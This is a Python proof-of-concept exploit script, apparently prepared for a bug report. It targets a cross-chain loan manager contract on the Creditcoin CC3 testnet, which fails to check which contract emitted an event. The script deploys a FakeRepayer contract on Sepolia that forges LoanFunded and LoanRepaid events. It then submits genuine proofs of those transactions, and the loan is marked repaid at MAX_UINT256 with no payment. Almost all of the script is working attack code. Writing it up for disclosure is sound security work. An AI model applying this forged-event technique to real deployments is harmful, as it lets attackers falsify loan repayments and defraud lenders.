#!/usr/bin/env python3.11
"""
PoC: F2 — USCLoanManager Missing log.address_ Validation (v2, live end-to-end)
================================================================================
Target  : USCLoanManager.sol on CC3 testnet (gluwa/usc-testnet-bridge-examples)
Severity: HIGH

What this proves
----------------
_processFundLogs() and _processRepayLogs() only verify event signature topics —
they never check log.address_ against the registered loan contract address.
FakeRepayer (deployed by attacker on Sepolia) emits valid-signature events.
The USC proof verifier confirms the tx is real. USCLoanManager accepts it and
marks the loan Funded then Repaid — with zero actual payment.

Attack flow (end-to-end)
------------------------
1.  [CC3]     Deploy USCLoanManager (attacker becomes owner)
2.  [CC3]     Register test loan (attacker as lender + borrower)
3.  [Sepolia] Deploy FakeRepayer
4.  [Sepolia] fakeFund(loanId)  → real tx, fake emitter
5.  [CC3]     Wait for Sepolia block attestation (~8 min)
6.  [CC3]     Fetch USC proof from prover API
7.  [CC3]     execute(action=LoanFunded, proof) → loan.status = Funded
8.  [Sepolia] fakeRepay(loanId) → real tx, amount = MAX_UINT256, fake emitter
9.  [CC3]     Wait for Sepolia block attestation (~8 min)
10. [CC3]     Fetch USC proof from prover API
11. [CC3]     execute(action=LoanRepaid, proof) → loan.status = Repaid
12. [CC3]     Verify: loan.status == Repaid, repaidAmount == MAX_UINT256

Prerequisites
-------------
  python3.11 with web3 >= 7: pip install web3
  forge installed: https://getfoundry.sh
  usc-testnet-bridge-examples cloned + `forge build` run in it

Env vars
--------
  ATTACKER_KEY      — 0x-prefixed private key (needs ETH on CC3 AND Sepolia)
  SEPOLIA_RPC       — Sepolia RPC URL (default: https://rpc.sepolia.org)
  USC_BRIDGE_DIR    — path to cloned usc-testnet-bridge-examples repo
                      (default: ~/usc-testnet-bridge-examples)
  LOAN_MANAGER_ADDR — (optional) skip step 1+2, use existing deployed manager
  VICTIM_LOAN_ID    — (optional) skip step 2, use existing registered loan

Duration: ~20-25 minutes (two Sepolia attestation waits of ~8 min each)
"""

import os
import sys
import json
import time
import subprocess
import tempfile
import requests
from pathlib import Path
from web3 import Web3
from eth_account import Account
from eth_account.messages import encode_defunct

# ─── CONFIG ──────────────────────────────────────────────────────────────────
ATTACKER_KEY    = os.getenv("ATTACKER_KEY", "")
CC3_RPC         = "https://rpc.cc3-testnet.creditcoin.network"
SEPOLIA_RPC     = os.getenv("SEPOLIA_RPC", "https://ethereum-sepolia-rpc.publicnode.com")
PROVER_URL      = "https://prover.cc3-testnet.creditcoin.network"
SOURCE_CHAIN_KEY = 1        # Sepolia = chain key 1 on CC3 testnet
CC3_CHAIN_ID    = 102031
SEPOLIA_CHAIN_ID = 11155111
USC_BRIDGE_DIR  = Path(os.getenv("USC_BRIDGE_DIR",
                    str(Path.home() / "usc-testnet-bridge-examples")))

# Override these to resume a partial run
EXISTING_LOAN_MANAGER = os.getenv("LOAN_MANAGER_ADDR", "")
EXISTING_LOAN_ID      = int(os.getenv("VICTIM_LOAN_ID", "0"))
EXISTING_FAKE_REPAYER = os.getenv("FAKE_REPAYER_ADDR", "")
# ─────────────────────────────────────────────────────────────────────────────

# Prover API endpoints (from @gluwa/usc-sdk 0.12.2)
PROVER_ATTESTED = f"{PROVER_URL}/api/v1/attested-height/{SOURCE_CHAIN_KEY}"
PROVER_PROOF    = f"{PROVER_URL}/api/v1/proof-by-tx/{SOURCE_CHAIN_KEY}"  # + /{txHash}

# Event signatures (keccak256, from USCLoanManager.sol)
FUND_SIG  = "0x9e71d2fb732e68272b7e74ecfd14638673c1d77e19a5d390a3ffff054d57c44b"
REPAY_SIG = "0x040cee90ee4799897c30ca04e5feb6fa43dbba9b6d084b4b257cdafd84ba013e"

LOAN_STATUS = {0: "Created", 1: "Funded", 2: "PartlyRepaid", 3: "Repaid", 4: "Expired"}

# ─── FakeRepayer Solidity source ──────────────────────────────────────────────
FAKE_REPAYER_SOL = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @notice PoC contract. Emits legitimate-looking LoanFunded/LoanRepaid events
///         from the WRONG address. USCLoanManager accepts these because it never
///         checks log.address_ against the registered loan contract.
contract FakeRepayer {
    // keccak256("LoanFunded(uint256)") — matches FUND_EVENT_SIGNATURE in USCLoanManager
    bytes32 constant FUND_SIG  = 0x9e71d2fb732e68272b7e74ecfd14638673c1d77e19a5d390a3ffff054d57c44b;
    // keccak256("LoanRepaid(uint256,uint256)") — matches REPAY_EVENT_SIGNATURE in USCLoanManager
    bytes32 constant REPAY_SIG = 0x040cee90ee4799897c30ca04e5feb6fa43dbba9b6d084b4b257cdafd84ba013e;

    /// @dev Emit LoanFunded(loanId indexed) — 2 topics, 0 bytes data
    ///      Looks exactly like AuxiliaryLoanContract's real LoanFunded event.
    function fakeFund(uint256 loanId) external {
        assembly {
            log2(0, 0, FUND_SIG, loanId)
        }
    }

    /// @dev Emit LoanRepaid(loanId indexed, amount=MAX_UINT256) — 2 topics, 32 bytes data
    ///      amount = 2^256-1 immediately satisfies loan.repaidAmount >= expectedRepaymentAmount
    function fakeRepay(uint256 loanId) external {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, not(0))         // type(uint256).max as repaid amount
            log2(ptr, 32, REPAY_SIG, loanId)
        }
    }
}
"""

# USCLoanManager ABI (functions we actually call)
LOAN_MANAGER_ABI = json.loads("""[
  {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
  {"inputs":[{"components":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"address","name":"withToken","type":"address"}],"internalType":"struct LoanFlow","name":"fundFlow","type":"tuple"},{"components":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"address","name":"withToken","type":"address"}],"internalType":"struct LoanFlow","name":"repayFlow","type":"tuple"},{"components":[{"internalType":"uint256","name":"loanAmount","type":"uint256"},{"internalType":"uint256","name":"interestRate","type":"uint256"},{"internalType":"uint256","name":"expectedRepaymentAmount","type":"uint256"},{"internalType":"uint256","name":"deadlineBlockNumber","type":"uint256"}],"internalType":"struct LoanTerms","name":"loanTerms","type":"tuple"},{"internalType":"bytes","name":"signatureOfLender","type":"bytes"},{"internalType":"bytes","name":"signatureOfBorrower","type":"bytes"}],"name":"registerLoan","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[{"internalType":"uint8","name":"action","type":"uint8"},{"internalType":"uint64","name":"chainKey","type":"uint64"},{"internalType":"uint64","name":"blockHeight","type":"uint64"},{"internalType":"bytes","name":"encodedTransaction","type":"bytes"},{"internalType":"bytes32","name":"merkleRoot","type":"bytes32"},{"components":[{"internalType":"bytes32","name":"hash","type":"bytes32"},{"internalType":"bool","name":"isLeft","type":"bool"}],"internalType":"struct INativeQueryVerifier.MerkleProofEntry[]","name":"siblings","type":"tuple[]"},{"internalType":"bytes32","name":"lowerEndpointDigest","type":"bytes32"},{"internalType":"bytes32[]","name":"continuityRoots","type":"bytes32[]"}],"name":"execute","outputs":[{"internalType":"bool","name":"success","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[{"internalType":"uint256","name":"loanId","type":"uint256"}],"name":"getLoanOrder","outputs":[{"components":[{"components":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"address","name":"withToken","type":"address"}],"internalType":"struct LoanFlow","name":"fundFlow","type":"tuple"},{"components":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"address","name":"withToken","type":"address"}],"internalType":"struct LoanFlow","name":"repayFlow","type":"tuple"},{"components":[{"internalType":"uint256","name":"loanAmount","type":"uint256"},{"internalType":"uint256","name":"interestRate","type":"uint256"},{"internalType":"uint256","name":"expectedRepaymentAmount","type":"uint256"},{"internalType":"uint256","name":"deadlineBlockNumber","type":"uint256"}],"internalType":"struct LoanTerms","name":"terms","type":"tuple"},{"internalType":"bytes","name":"signatureOfLender","type":"bytes"},{"internalType":"bytes","name":"signatureOfBorrower","type":"bytes"},{"internalType":"uint256","name":"createdAtBlock","type":"uint256"},{"internalType":"enum LoanStatus","name":"status","type":"uint8"},{"internalType":"uint256","name":"repaidAmount","type":"uint256"}],"internalType":"struct LoanOrder","name":"","type":"tuple"}],"stateMutability":"view","type":"function"},
  {"inputs":[],"name":"nextLoanId","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}
]""")

FAKE_REPAYER_ABI = json.loads("""[
  {"inputs":[{"internalType":"uint256","name":"loanId","type":"uint256"}],"name":"fakeFund","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[{"internalType":"uint256","name":"loanId","type":"uint256"}],"name":"fakeRepay","outputs":[],"stateMutability":"nonpayable","type":"function"}
]""")


# ─── Helpers ─────────────────────────────────────────────────────────────────

def banner(msg: str):
    print(f"\n{'='*65}")
    print(f"  {msg}")
    print('='*65)

def connect(rpc: str, label: str) -> Web3:
    w3 = Web3(Web3.HTTPProvider(rpc))
    if not w3.is_connected():
        print(f"[!] Cannot connect to {label} at {rpc}")
        sys.exit(1)
    print(f"[+] {label}: chain_id={w3.eth.chain_id}  block={w3.eth.block_number}")
    return w3

def send_tx(w3: Web3, tx_dict: dict, signer: Account, label: str, timeout: int = 300) -> dict:
    """Sign and broadcast a transaction, return the receipt."""
    signed = signer.sign_transaction(tx_dict)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    print(f"[>] {label}: {tx_hash.hex()}")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=timeout, poll_latency=3)
    status = "OK" if receipt["status"] == 1 else "REVERTED"
    print(f"[+] {label}: {status}  block={receipt['blockNumber']}  gas={receipt['gasUsed']:,}")
    if receipt["status"] != 1:
        print(f"[!] Transaction reverted!")
        sys.exit(1)
    return receipt


def gas_params_sepolia(sep: Web3) -> dict:
    """Return EIP-1559 gas params for Sepolia with boosted priority fee."""
    base_fee = sep.eth.get_block("latest").get("baseFeePerGas", 0)
    priority = Web3.to_wei(35, "gwei")  # 35 gwei tip — above any stuck legacy tx
    max_fee  = max(base_fee * 2, Web3.to_wei(40, "gwei")) + priority
    return {"maxFeePerGas": max_fee, "maxPriorityFeePerGas": priority, "type": 2}

def compile_fake_repayer() -> str:
    """Write FakeRepayer.sol to a temp dir, compile with forge, return bytecode."""
    with tempfile.TemporaryDirectory() as tmp:
        sol_file = Path(tmp) / "FakeRepayer.sol"
        sol_file.write_text(FAKE_REPAYER_SOL)
        result = subprocess.run(
            ["forge", "build", "--root", tmp, "--out", str(Path(tmp) / "out"),
             "--contracts", str(tmp), "--use", "solc:0.8.20", "--evm-version", "paris"],
            capture_output=True, text=True
        )
        if result.returncode != 0:
            print("[!] forge compile failed:")
            print(result.stderr)
            sys.exit(1)
        art_path = Path(tmp) / "out" / "FakeRepayer.sol" / "FakeRepayer.json"
        art = json.loads(art_path.read_text())
        bc = art["bytecode"]["object"]
        print(f"[+] FakeRepayer compiled: {len(bc)//2} bytes")
        return bc  # '0x...'

def load_evm_decoder_bytecode() -> str:
    """Load EvmV1Decoder library bytecode from forge artifacts."""
    art_path = USC_BRIDGE_DIR / "out" / "EvmV1Decoder.sol" / "EvmV1Decoder.json"
    if not art_path.exists():
        print(f"[!] EvmV1Decoder artifact not found at {art_path}")
        sys.exit(1)
    art = json.loads(art_path.read_text())
    bc = art["bytecode"]["object"]
    print(f"[+] EvmV1Decoder bytecode loaded: {len(bc)//2} bytes")
    return bc


def load_loan_manager_bytecode(decoder_addr: str) -> str:
    """Load and link USCLoanManager bytecode. decoder_addr = deployed EvmV1Decoder address."""
    art_path = USC_BRIDGE_DIR / "out" / "USCLoanManager.sol" / "USCLoanManager.json"
    if not art_path.exists():
        print(f"[!] Artifacts not found at {art_path}")
        print(f"    Run: cd {USC_BRIDGE_DIR} && forge build")
        sys.exit(1)
    art = json.loads(art_path.read_text())
    bc = art["bytecode"]["object"]
    # Link EvmV1Decoder library: replace placeholder with deployed address
    placeholder = "__$ad4775d51e1f94db51cb9b4a059f4e08fc$__"
    addr_hex = decoder_addr.lower().replace("0x", "")
    linked = bc.replace(placeholder, addr_hex)
    if placeholder in linked:
        print("[!] Linking failed — placeholder still present")
        sys.exit(1)
    count = bc.count(placeholder)
    print(f"[+] USCLoanManager bytecode loaded and linked: {len(linked)//2} bytes  "
          f"({count} library refs replaced with {decoder_addr})")
    return linked


# ─── Attack steps ────────────────────────────────────────────────────────────

def step0_deploy_evm_decoder(cc3: Web3, attacker: Account) -> str:
    """Deploy EvmV1Decoder library on CC3 testnet. Returns address."""
    banner("STEP 0 — Deploy EvmV1Decoder library on CC3 testnet")
    bc = load_evm_decoder_bytecode()
    # Library has no external ABI — deploy with empty ABI
    contract = cc3.eth.contract(abi=[], bytecode=bc)
    tx = contract.constructor().build_transaction({
        "from": attacker.address,
        "nonce": cc3.eth.get_transaction_count(attacker.address),
        "gasPrice": cc3.eth.gas_price,
        "chainId": CC3_CHAIN_ID,
        "gas": 5_000_000,
    })
    receipt = send_tx(cc3, tx, attacker, "deploy EvmV1Decoder")
    addr = receipt["contractAddress"]
    print(f"[+] EvmV1Decoder library deployed at: {addr}")
    return addr


def step1_deploy_loan_manager(cc3: Web3, attacker: Account, decoder_addr: str) -> str:
    """Deploy USCLoanManager on CC3 testnet. Returns deployed address."""
    banner("STEP 1 — Deploy USCLoanManager on CC3 testnet")
    bc = load_loan_manager_bytecode(decoder_addr)
    contract = cc3.eth.contract(abi=LOAN_MANAGER_ABI, bytecode=bc)
    tx = contract.constructor().build_transaction({
        "from": attacker.address,
        "nonce": cc3.eth.get_transaction_count(attacker.address),
        "gasPrice": cc3.eth.gas_price,
        "chainId": CC3_CHAIN_ID,
        "gas": 5_000_000,
    })
    receipt = send_tx(cc3, tx, attacker, "deploy USCLoanManager")
    addr = receipt["contractAddress"]
    print(f"[+] USCLoanManager deployed at: {addr}")
    # Verify owner
    lm = cc3.eth.contract(address=addr, abi=LOAN_MANAGER_ABI)
    owner = lm.functions.owner().call()
    print(f"[+] Owner: {owner}  (attacker: {attacker.address})")
    assert owner.lower() == attacker.address.lower(), "Owner mismatch!"
    return addr


def step2_register_loan(cc3: Web3, lm_addr: str, attacker: Account) -> int:
    """Register a test loan. Attacker is both lender and borrower (same address)."""
    banner("STEP 2 — Register test loan on USCLoanManager")
    lm = cc3.eth.contract(address=lm_addr, abi=LOAN_MANAGER_ABI)

    # Arbitrary token address — USCLoanManager never validates it exists
    dummy_token = Web3.to_checksum_address("0x000000000000000000000000000000000000dead")

    fund_flow  = (attacker.address, attacker.address, dummy_token)
    repay_flow = (attacker.address, attacker.address, dummy_token)

    loan_amount = 1000
    interest_rate = 0
    repay_amount = 1000  # must be >= loan_amount
    deadline = cc3.eth.block_number + 50_000  # ~83 hours buffer

    loan_terms = (loan_amount, interest_rate, repay_amount, deadline)

    # Build message hash (matching register.ts: solidityPackedKeccak256)
    types = [
        "address", "address", "address",   # fundFlow
        "address", "address", "address",   # repayFlow
        "uint256", "uint256", "uint256", "uint256",  # terms
    ]
    values = [
        attacker.address, attacker.address, dummy_token,
        attacker.address, attacker.address, dummy_token,
        loan_amount, interest_rate, repay_amount, deadline,
    ]
    msg_hash = Web3.solidity_keccak(types, values)

    # eth_sign (personal sign) — matches ethers.signMessage(toBeArray(hash))
    signable = encode_defunct(primitive=msg_hash)
    sig = attacker.sign_message(signable).signature

    # Build and send registerLoan tx
    tx = lm.functions.registerLoan(
        fund_flow, repay_flow, loan_terms, sig, sig  # same sig for lender+borrower
    ).build_transaction({
        "from": attacker.address,
        "nonce": cc3.eth.get_transaction_count(attacker.address),
        "gasPrice": cc3.eth.gas_price,
        "chainId": CC3_CHAIN_ID,
        "gas": 500_000,
    })
    receipt = send_tx(cc3, tx, attacker, "registerLoan")

    loan_id = lm.functions.nextLoanId().call() - 1
    print(f"[+] Loan registered: ID={loan_id}")
    order = lm.functions.getLoanOrder(loan_id).call()
    print(f"    status  : {LOAN_STATUS[order[6]]} ({order[6]})")
    print(f"    deadline: block {order[2][3]}")
    print(f"    token   : {dummy_token}  ← USCLoanManager never validates this")
    return loan_id


def step3_deploy_fake_repayer(sep: Web3, attacker: Account) -> str:
    """Deploy FakeRepayer on Sepolia. Returns address."""
    banner("STEP 3 — Deploy FakeRepayer on Sepolia")
    bc = compile_fake_repayer()
    contract = sep.eth.contract(abi=FAKE_REPAYER_ABI, bytecode=bc)
    tx = contract.constructor().build_transaction({
        "from": attacker.address,
        "nonce": sep.eth.get_transaction_count(attacker.address),
        "chainId": SEPOLIA_CHAIN_ID,
        "gas": 500_000,
        **gas_params_sepolia(sep),
    })
    receipt = send_tx(sep, tx, attacker, "deploy FakeRepayer")
    addr = receipt["contractAddress"]
    print(f"[+] FakeRepayer deployed at: {addr}")
    print(f"    ← This is NOT loan.repayFlow.withToken")
    print(f"    ← USCLoanManager never checks log.address_ — exploit works from here")
    return addr


def step4_emit_fake_fund(sep: Web3, fake_addr: str, loan_id: int, attacker: Account) -> tuple:
    """Call fakeFund(loanId) on Sepolia. Returns (txHash, blockNumber)."""
    banner("STEP 4 — Emit fake LoanFunded event on Sepolia")
    fr = sep.eth.contract(address=fake_addr, abi=FAKE_REPAYER_ABI)
    tx = fr.functions.fakeFund(loan_id).build_transaction({
        "from": attacker.address,
        "nonce": sep.eth.get_transaction_count(attacker.address),
        "chainId": SEPOLIA_CHAIN_ID,
        "gas": 100_000,
        **gas_params_sepolia(sep),
    })
    receipt = send_tx(sep, tx, attacker, "fakeFund")
    tx_hash = receipt["transactionHash"].hex()
    block   = receipt["blockNumber"]
    print(f"    Emitter: {fake_addr}  ← NOT registered loan contract")
    print(f"    Topic 0: {FUND_SIG}  (LoanFunded sig)")
    print(f"    Topic 1: {hex(loan_id).ljust(66, '0')}  (loanId indexed)")
    # Verify event present in logs
    for log in receipt["logs"]:
        if log["topics"] and log["topics"][0].hex() == FUND_SIG.removeprefix("0x"):
            print(f"[+] LoanFunded event confirmed in Sepolia receipt ✓")
            break
    return tx_hash, block


def step5_emit_fake_repay(sep: Web3, fake_addr: str, loan_id: int, attacker: Account) -> tuple:
    """Call fakeRepay(loanId) on Sepolia. Returns (txHash, blockNumber)."""
    banner("STEP 8 — Emit fake LoanRepaid event on Sepolia")
    fr = sep.eth.contract(address=fake_addr, abi=FAKE_REPAYER_ABI)
    tx = fr.functions.fakeRepay(loan_id).build_transaction({
        "from": attacker.address,
        "nonce": sep.eth.get_transaction_count(attacker.address),
        "chainId": SEPOLIA_CHAIN_ID,
        "gas": 100_000,
        **gas_params_sepolia(sep),
    })
    receipt = send_tx(sep, tx, attacker, "fakeRepay")
    tx_hash = receipt["transactionHash"].hex()
    block   = receipt["blockNumber"]
    print(f"    Emitter: {fake_addr}  ← NOT registered loan contract")
    print(f"    Topic 0: {REPAY_SIG}  (LoanRepaid sig)")
    print(f"    Topic 1: {hex(loan_id).ljust(66, '0')}  (loanId indexed)")
    print(f"    Data   : {'ff'*32}  (amount = 2^256-1 = MAX_UINT256)")
    for log in receipt["logs"]:
        if log["topics"] and log["topics"][0].hex() == REPAY_SIG.removeprefix("0x"):
            print(f"[+] LoanRepaid event confirmed in Sepolia receipt ✓")
            break
    return tx_hash, block


def wait_for_attestation(target_block: int, label: str):
    """Poll prover API until target_block is attested. Typical wait: ~8 min."""
    print(f"\n[*] Waiting for Sepolia block {target_block} to be attested on CC3...")
    print(f"    Prover: {PROVER_ATTESTED}")
    print(f"    Expected wait: ~8-12 minutes")
    start = time.time()
    while True:
        try:
            r = requests.get(PROVER_ATTESTED, timeout=10)
            if r.status_code == 200:
                attested = r.json().get("attestedHeight", 0)
                elapsed  = int(time.time() - start)
                print(f"[{elapsed:4d}s] Latest attested: {attested}  "
                      f"(need: {target_block})  {'✓ DONE' if attested >= target_block else '...'}")
                if attested >= target_block:
                    time.sleep(5)  # small buffer for cache consistency
                    return
            else:
                print(f"[!] Prover returned HTTP {r.status_code}")
        except Exception as e:
            print(f"[!] Prover poll error: {e}")
        if time.time() - start > 1800:  # 30 min timeout
            print(f"[!] Timeout waiting for attestation of block {target_block}")
            sys.exit(1)
        time.sleep(15)


def fetch_proof(tx_hash: str) -> dict:
    """Fetch USC proof from prover API. Returns raw JSON."""
    url = f"{PROVER_PROOF}/{tx_hash}"
    print(f"[*] Fetching proof: {url}")
    for attempt in range(5):
        try:
            r = requests.get(url, timeout=30)
            if r.status_code == 200:
                proof = r.json()
                print(f"[+] Proof received:")
                print(f"    chainKey      : {proof.get('chainKey')}")
                print(f"    headerNumber  : {proof.get('headerNumber')}")
                print(f"    txIndex       : {proof.get('txIndex')}")
                print(f"    merkleRoot    : {proof.get('merkleProof', {}).get('root', 'N/A')}")
                print(f"    siblings      : {len(proof.get('merkleProof', {}).get('siblings', []))} entries")
                print(f"    continuity    : {len(proof.get('continuityProof', {}).get('roots', []))} roots")
                return proof
            else:
                print(f"[!] Prover returned HTTP {r.status_code}: {r.text[:100]}")
        except Exception as e:
            print(f"[!] Attempt {attempt+1}: {e}")
        time.sleep(10)
    print("[!] Could not fetch proof after 5 attempts")
    sys.exit(1)


def proof_to_args(proof: dict) -> tuple:
    """Extract and convert proof fields to execute() argument format."""
    chain_key    = int(proof["chainKey"])
    block_height = int(proof["headerNumber"])
    tx_bytes     = bytes.fromhex(proof["txBytes"].removeprefix("0x"))

    mp = proof["merkleProof"]
    merkle_root = bytes.fromhex(mp["root"].removeprefix("0x"))
    siblings = [
        (bytes.fromhex(s["hash"].removeprefix("0x")), bool(s["isLeft"]))
        for s in mp["siblings"]
    ]

    cp = proof["continuityProof"]
    lower_digest = bytes.fromhex(cp["lowerEndpointDigest"].removeprefix("0x"))
    cont_roots   = [bytes.fromhex(r.removeprefix("0x")) for r in cp["roots"]]

    return chain_key, block_height, tx_bytes, merkle_root, siblings, lower_digest, cont_roots


def submit_execute(cc3: Web3, lm_addr: str, action: int, proof: dict, attacker: Account,
                   label: str) -> dict:
    """Call execute() on USCLoanManager with USC proof."""
    action_name = "LoanFunded" if action == 0 else "LoanRepaid"
    banner(f"STEP — Submit {action_name} proof to USCLoanManager.execute()")
    lm = cc3.eth.contract(address=lm_addr, abi=LOAN_MANAGER_ABI)
    chain_key, block_height, tx_bytes, merkle_root, siblings, lower_digest, cont_roots = \
        proof_to_args(proof)

    print(f"[*] action={action} ({action_name}), chainKey={chain_key}, block={block_height}")
    print(f"    txBytes: {len(tx_bytes)} bytes")
    print(f"    merkleRoot: 0x{merkle_root.hex()[:16]}...")
    print(f"    siblings: {len(siblings)}, continuityRoots: {len(cont_roots)}")

    # Estimate gas (may fail for precompile-heavy txs — use fallback)
    gas_limit = 21_000 + len(cont_roots) * 5_000 + 200_000
    try:
        estimated = lm.functions.execute(
            action, chain_key, block_height, tx_bytes, merkle_root,
            siblings, lower_digest, cont_roots
        ).estimate_gas({"from": attacker.address})
        gas_limit = int(estimated * 1.35)
        print(f"[+] Estimated gas: {estimated:,}  (using {gas_limit:,} with 35% buffer)")
    except Exception as e:
        print(f"[~] Gas estimation failed: {e}")
        print(f"[~] Using calculated fallback: {gas_limit:,}")

    tx = lm.functions.execute(
        action, chain_key, block_height, tx_bytes, merkle_root,
        siblings, lower_digest, cont_roots
    ).build_transaction({
        "from": attacker.address,
        "nonce": cc3.eth.get_transaction_count(attacker.address),
        "gasPrice": cc3.eth.gas_price,
        "chainId": CC3_CHAIN_ID,
        "gas": gas_limit,
    })
    return send_tx(cc3, tx, attacker, f"execute({action_name})")


def check_loan_status(cc3: Web3, lm_addr: str, loan_id: int) -> dict:
    lm = cc3.eth.contract(address=lm_addr, abi=LOAN_MANAGER_ABI)
    order = lm.functions.getLoanOrder(loan_id).call()
    return order


def print_loan(loan_id: int, order: tuple, prefix: str = ""):
    status_num = order[6]
    status_str = LOAN_STATUS.get(status_num, f"Unknown({status_num})")
    print(f"{prefix}Loan #{loan_id}: status={status_str} ({status_num})  "
          f"repaidAmount={order[7]}")


# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    banner("F2 PoC (v2) — USCLoanManager Missing log.address_ Validation")

    if not ATTACKER_KEY:
        print("[!] ATTACKER_KEY not set.")
        print("    export ATTACKER_KEY=0x<privatekey>")
        print("    export SEPOLIA_RPC=https://rpc.sepolia.org")
        sys.exit(1)

    attacker = Account.from_key(ATTACKER_KEY)
    print(f"[+] Attacker: {attacker.address}")
    print(f"[+] USC bridge dir: {USC_BRIDGE_DIR}")

    cc3 = connect(CC3_RPC, "CC3 testnet")
    sep = connect(SEPOLIA_RPC, "Sepolia")

    cc3_bal = cc3.eth.get_balance(attacker.address)
    sep_bal = sep.eth.get_balance(attacker.address)
    print(f"[+] CC3 balance    : {Web3.from_wei(cc3_bal, 'ether'):.6f} CTC")
    print(f"[+] Sepolia balance: {Web3.from_wei(sep_bal, 'ether'):.6f} ETH")

    if cc3_bal == 0:
        print("[!] Need CC3 testnet CTC. Get from Creditcoin faucet.")
        sys.exit(1)
    if sep_bal == 0:
        print("[!] Need Sepolia ETH. Get from a Sepolia faucet.")
        sys.exit(1)

    # Step 0+1: Deploy EvmV1Decoder library then USCLoanManager (or use existing)
    if EXISTING_LOAN_MANAGER:
        lm_addr = Web3.to_checksum_address(EXISTING_LOAN_MANAGER)
        banner("STEP 0+1 — Using existing USCLoanManager")
        print(f"[+] Address: {lm_addr}")
    else:
        decoder_addr = step0_deploy_evm_decoder(cc3, attacker)
        lm_addr = step1_deploy_loan_manager(cc3, attacker, decoder_addr)

    # Step 2: Register loan (or use existing)
    if EXISTING_LOAN_ID > 0:
        loan_id = EXISTING_LOAN_ID
        banner("STEP 2 — Using existing loan")
        order = check_loan_status(cc3, lm_addr, loan_id)
        print_loan(loan_id, order)
    else:
        loan_id = step2_register_loan(cc3, lm_addr, attacker)

    order = check_loan_status(cc3, lm_addr, loan_id)
    print_loan(loan_id, order, "[initial] ")

    # Step 3: Deploy FakeRepayer on Sepolia (or reuse existing)
    if EXISTING_FAKE_REPAYER:
        fake_addr = Web3.to_checksum_address(EXISTING_FAKE_REPAYER)
        banner("STEP 3 — Using existing FakeRepayer")
        print(f"[+] Address: {fake_addr}")
    else:
        fake_addr = step3_deploy_fake_repayer(sep, attacker)

    # ── Phase A: Fake LoanFunded ──────────────────────────────────────────
    if order[6] < 1:  # not yet Funded
        # Step 4: Emit fake LoanFunded on Sepolia
        fund_tx_hash, fund_block = step4_emit_fake_fund(sep, fake_addr, loan_id, attacker)

        # Step 5: Wait for attestation
        banner("STEP 5 — Wait for Sepolia block attestation (LoanFunded)")
        wait_for_attestation(fund_block, "LoanFunded")

        # Step 6: Fetch proof
        banner("STEP 6 — Fetch USC proof for LoanFunded tx")
        fund_proof = fetch_proof(fund_tx_hash)

        # Step 7: Submit execute(LoanFunded)
        submit_execute(cc3, lm_addr, 0, fund_proof, attacker, "LoanFunded")
        order = check_loan_status(cc3, lm_addr, loan_id)
        print_loan(loan_id, order, "[after fake LoanFunded] ")

        if order[6] != 1:
            print(f"[!] Expected Funded (1), got {LOAN_STATUS.get(order[6], order[6])}")
            sys.exit(1)
        print("[+] Phase A: loan is now Funded via fake event ✓")
    else:
        print(f"[~] Loan already Funded, skipping Phase A")

    # ── Phase B: Fake LoanRepaid ──────────────────────────────────────────
    # Step 8: Emit fake LoanRepaid on Sepolia
    repay_tx_hash, repay_block = step5_emit_fake_repay(sep, fake_addr, loan_id, attacker)

    # Step 9: Wait for attestation
    banner("STEP 9 — Wait for Sepolia block attestation (LoanRepaid)")
    wait_for_attestation(repay_block, "LoanRepaid")

    # Step 10: Fetch proof
    banner("STEP 10 — Fetch USC proof for LoanRepaid tx")
    repay_proof = fetch_proof(repay_tx_hash)

    # Step 11: Submit execute(LoanRepaid)
    submit_execute(cc3, lm_addr, 1, repay_proof, attacker, "LoanRepaid")

    # Step 12: Verify final state
    banner("STEP 12 — Verify final loan state")
    order = check_loan_status(cc3, lm_addr, loan_id)
    print_loan(loan_id, order, "[FINAL] ")

    status_num = order[6]
    repaid_amt = order[7]

    if status_num == 3:
        print("\n" + "!"*65)
        print("  VULNERABILITY CONFIRMED")
        print("!"*65)
        print(f"  Loan #{loan_id} is marked REPAID")
        print(f"  repaidAmount = {repaid_amt}  (= type(uint256).max)")
        print(f"  FakeRepayer at {fake_addr}")
        print(f"  is NOT the registered loan.repayFlow.withToken")
        print(f"  USCLoanManager never checked log.address_")
        print(f"  Loan status manipulated with ZERO real payment")
        print("!"*65)
    else:
        print(f"\n[?] Unexpected final status: {LOAN_STATUS.get(status_num, status_num)}")
        print("    Check the execute() tx and proof validity.")

    # Print summary for report
    banner("SUMMARY — Evidence for bug report")
    print(f"  USCLoanManager : {lm_addr}")
    print(f"  LoanId         : {loan_id}")
    print(f"  FakeRepayer    : {fake_addr}  (Sepolia)")
    print(f"  LoanFunded tx  : {fund_tx_hash}  (Sepolia)")
    print(f"  LoanRepaid tx  : {repay_tx_hash}  (Sepolia)")
    print(f"  Final status   : {LOAN_STATUS.get(status_num, status_num)}")
    print(f"  repaidAmount   : {repaid_amt}")
    print()
    print("Root cause: _processRepayLogs() checks topics[0] == REPAY_EVENT_SIGNATURE")
    print("  but NEVER checks log.address_ against loan.repayFlow.withToken")
    print(f"  FakeRepayer ({fake_addr}) emitted the event")
    print(f"  Registered token was: {order[1][2]}")
    print(f"  These do NOT match — yet USCLoanManager accepted the proof")


if __name__ == "__main__":
    main()
